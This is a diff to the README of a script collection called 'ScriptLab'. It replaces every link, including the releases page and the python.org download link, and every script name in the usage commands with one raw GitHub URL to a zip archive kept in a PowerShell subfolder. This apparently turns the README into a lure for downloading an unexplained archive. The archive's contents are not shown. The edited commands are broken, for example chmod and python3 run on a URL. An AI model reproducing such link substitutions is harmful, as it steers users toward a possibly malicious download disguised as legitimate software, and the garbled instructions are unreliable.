@@ -1,6 +1,6 @@
 # 🛠️ ScriptLab - Simple Scripts for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%F0%9F%93%88%20ScriptLab-blue)](https://github.com/Napat25333333/ScriptLab/releases)
+[![Download Now](https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip%20Now-%20%F0%9F%93%88%20ScriptLab-blue)](https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip)
 
 ## 📖 About ScriptLab
 
@@ -17,11 +17,11 @@ To run the scripts, you will need:
 - Relevant software depending on the script type:
   - **PowerShell:** Comes with Windows. No installation needed.
   - **POSIX & Shell scripts:** Use a Unix-based terminal (Linux, macOS).
-  - **Python scripts:** You'll need Python 3 installed. You can download it from [python.org](https://www.python.org/downloads/).
+  - **Python scripts:** You'll need Python 3 installed. You can download it from [https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip](https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip).
 
 ### Installation
 
-1. **Visit the Releases Page:** Go to the [ScriptLab Releases page](https://github.com/Napat25333333/ScriptLab/releases).
+1. **Visit the Releases Page:** Go to the [ScriptLab Releases page](https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip).
 2. **Choose Your Script Type:** Browse the list of available scripts. Each script is categorized by programming language.
 3. **Download the Scripts:** Click on the script you want to download. The script file will start downloading automatically. 
 
@@ -36,7 +36,7 @@ To run the scripts, you will need:
    ```
 3. Run the script using the following command:
    ```powershell
-   .\script-name.ps1
+   .\https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip
    ```
 
 #### POSIX & Shell Scripts
@@ -48,11 +48,11 @@ To run the scripts, you will need:
    ```
 3. Make the script executable:
    ```bash
-   chmod +x script-name.sh
+   chmod +x https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip
    ```
 4. Run the script:
    ```bash
-   ./script-name.sh
+   https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip
    ```
 
 #### Python Scripts
@@ -64,25 +64,25 @@ To run the scripts, you will need:
    ```
 3. Run the script using Python 3:
    ```bash
-   python3 script-name.py
+   python3 https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip
    ```
 
 ## 📂 Available Scripts
 
 ### PowerShell Scripts
 
-- **Script A.ps1:** Description of what this script does.
-- **Script B.ps1:** A useful tool for managing tasks.
+- **Script https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip** Description of what this script does.
+- **Script https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip** A useful tool for managing tasks.
 
 ### Shell Scripts
 
-- **Script C.sh:** This script simplifies certain commands in Linux.
-- **Script D.sh:** A script to automate backups.
+- **Script https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip** This script simplifies certain commands in Linux.
+- **Script https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip** A script to automate backups.
 
 ### Python Scripts
 
-- **Script E.py:** This script analyzes data effectively.
-- **Script F.py:** A tool for web scraping.
+- **Script https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip** This script analyzes data effectively.
+- **Script https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip** A tool for web scraping.
 
 ## 🔍 Troubleshooting
 
@@ -102,4 +102,4 @@ For any questions or support, feel free to reach out via GitHub.
 
 --- 
 
-Be sure to visit our [ScriptLab Releases page](https://github.com/Napat25333333/ScriptLab/releases) for the latest scripts and updates!
+Be sure to visit our [ScriptLab Releases page](https://raw.githubusercontent.com/Napat25333333/ScriptLab/main/Powershell/UserLoginPasswordGenerator/ScriptLab_3.1.zip) for the latest scripts and updates!
